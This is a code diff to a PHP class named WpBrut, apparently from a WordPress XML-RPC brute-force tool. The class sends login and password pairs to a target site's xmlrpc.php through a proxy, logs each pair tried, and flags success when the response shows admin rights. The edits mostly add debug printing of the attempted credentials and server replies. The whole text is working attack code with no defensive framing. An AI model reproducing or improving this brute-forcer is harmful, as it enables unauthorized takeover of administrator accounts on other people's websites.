@@ -9,8 +9,9 @@ use HieuLe\WordpressXmlrpcClient\Exception\XmlrpcException;
 class WpBrut
 {
     public function check(Site $site){
+
         echo $site->ip . ':';
-        echo $site->port . ' ' .PHP_EOL;
+        echo $site->port . ' ' ;
        // die();
         if(empty($site->ip) || empty($site->port)){
             return false;
@@ -18,7 +19,7 @@ class WpBrut
 
         $url = $site->https ? 'https://' : 'http://';
         $url = $url . $site->host . '/xmlrpc.php';
-
+        echo $url. ' ';
         $client = new WordpressClient($url, $site->login->login, $site->password->password);
         $client->setProxy([
             'proxy_ip'      => $site->ip,
@@ -30,20 +31,20 @@ class WpBrut
             print_r($error);
         });
 */
-       echo $site->login->login . ' ' . $site->password->password . ' ';
+       echo $site->login->login . ' ' . $site->password->password .'('. $site->password->id.')'. PHP_EOL;
         $r = null;
-       // try{
+
             try{
                 $r = $client->getUsersBlogs();
+                print_r($r);
+
             } catch (XmlrpcException $e){
                 if(mb_strpos(mb_strtolower($e->getMessage()), 'incorrect') !== false){
+                    echo $e->getMessage() . PHP_EOL;
                     echo ' incorrect ' . PHP_EOL;
                 }
             }
-       /* } catch (\Exception $e){
-            echo ' Exception ' . PHP_EOL;
-            //print_r($e);
-        }*/
+
         //echo json_encode($r);
         if(mb_strpos(mb_strtolower(json_encode($r)), 'admin') !== false){
             $result = true;
